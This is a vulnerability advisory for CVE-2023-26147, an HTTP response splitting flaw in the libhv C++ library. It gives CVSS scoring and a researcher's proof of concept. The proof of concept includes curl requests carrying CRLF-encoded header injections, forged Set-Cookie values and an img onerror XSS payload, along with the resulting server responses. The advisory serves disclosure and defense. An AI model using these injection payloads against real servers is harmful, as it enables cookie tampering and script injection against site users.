[CVE-2023-26147  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2023-26147) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-113  (opens in a new tab)](https://cwe.mitre.org/data/definitions/113.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

There is no fixed version for `ithewei/libhv`.

## Overview

Affected versions of this package are vulnerable to HTTP Response Splitting when untrusted user input is used to build headers values. An attacker can add the `\r\n` (carriage return line feeds) characters to end the HTTP response headers and inject malicious content, like for example additional headers or new response body, leading to a potential XSS vulnerability.

## PoC

### CVSS Scores

version 3.1
### Snyk

5.3 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is limited. The data modification does not have a direct, serious impact on the impacted component.

  **Low**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**

HTTP Response Splitting in libhv@v1.3.0

 [Raw](/dellalibera/2be265b56b7b3b00de1a777b9dec0c7b/raw/a110b8e09d3e7a9e80e1eb46beb8709af331cdc7/01_HTTP_Response_Splitting_libhv%40v1.3.0.md)

[**01\_HTTP\_Response\_Splitting\_libhv@v1.3.0.md**](#file-01_http_response_splitting_libhv-v1-3-0-md)

# Information

**Project:** `libhv`

**Tested Version:** `v1.3.0` (commit `579938146ff0cd99d379c038bea80d3241c5bc36`)

**Github Repository:** [`https://github.com/ithewei/libhv`](https://github.com/ithewei/libhv)

## Details

`libhv` is vulnerable to **HTTP Response Splitting** when untrusted user input is used to build headers values. An attacker can add the `\r\n` (carriage return line feeds) characters to end the HTTP response headers and inject malicious content, like for example additional headers or new response body, leading to a potential XSS vulnerability.

References about this vulnerability and its impact:

* <https://owasp.org/www-community/attacks/HTTP_Response_Splitting>
* <https://cwe.mitre.org/data/definitions/113.html>

References to similar issues affecting other projects:

* <https://security.snyk.io/vuln/SNYK-SWIFT-APPLESWIFTNIO-3105796>

## Setup

Install and build the project <https://github.com/ithewei/libhv#%EF%B8%8F-build>

```
git clone https://github.com/ithewei/libhv.git
cd libhv
mkdir build
cd build
cmake ..
cmake --build .

```
## PoC

The PoC demonstrates how it's possible to add arbitrary headers and response body if user controlled values are used to set the headers value.

* paste the `http_server_test.cpp` content under <https://github.com/ithewei/libhv/blob/master/examples/http_server_test.cpp>
* start the server

```
cmake --build .
./bin/http_server_test

```

* run the following `curl` commands to observe the response (or directly open the links in the browser to see the xss alert)

```
curl -i -X GET "http://localhost:8080/test1?name=test%0d%0aSet-Cookie:foo%3Dbar%0d%0aContent-Type:text/html%0d%0a%0a%3Cimg+src%3dx+onerror%3dalert(%22hello%22)+/%3E%0d%0a"
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 39
Content-Type: text/plain
Date: Tue, 16 May 2023 10:28:06 GMT
MyHeader: User-test
Set-Cookie:foo=bar
Content-Type:text/html

<img src=x onerror=alert("hello") />

```
```
curl -i -X GET "http://localhost:8080/test2?location=test1%0d%0aFoo:+Bar%0d%0aSet-Cookie:admin%3D1"
HTTP/1.1 301 Moved Permanently
Connection: keep-alive
Content-Length: 0
Date: Tue, 16 May 2023 10:28:19 GMT
Location: test1
Foo: Bar
Set-Cookie:admin=1
Server: httpd/1.23.5.16

```
## Impact

If untrusted user input is placed in header values, a malicious user could inject additional headers or new response body, leading to a potential XSS vulnerability or a number of other issues.
